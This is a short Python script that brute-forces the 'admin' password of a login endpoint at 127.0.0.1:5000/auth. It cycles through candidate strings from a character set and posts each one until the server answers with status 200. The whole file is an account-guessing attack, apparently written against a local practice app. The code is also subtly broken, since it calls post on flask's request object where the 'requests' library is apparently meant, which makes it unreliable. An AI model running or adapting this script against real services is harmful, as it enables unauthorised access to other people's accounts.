from flask import request

symbols = '0123456789qwertyuiopasdfghjklzxcvbnm_!&^%$#@-*?><'
password_index = 0


def get_password():
    '''
    Generating a password from a string of available characters
    :return: password
    '''
    global password_index

    password = ''
    index = password_index
    while index > 0:
        rest = index % len(symbols)
        index = index // len(symbols)

        password += symbols[rest]

    password_index += 1
    return password


status_code = 0
while status_code != 200:
    password = get_password()
    print(password)
    r = request.post('http://127.0.0.1:5000/auth', data={'login': 'admin', 'password': password})
    status_code = r.status_code
    print(r.text)
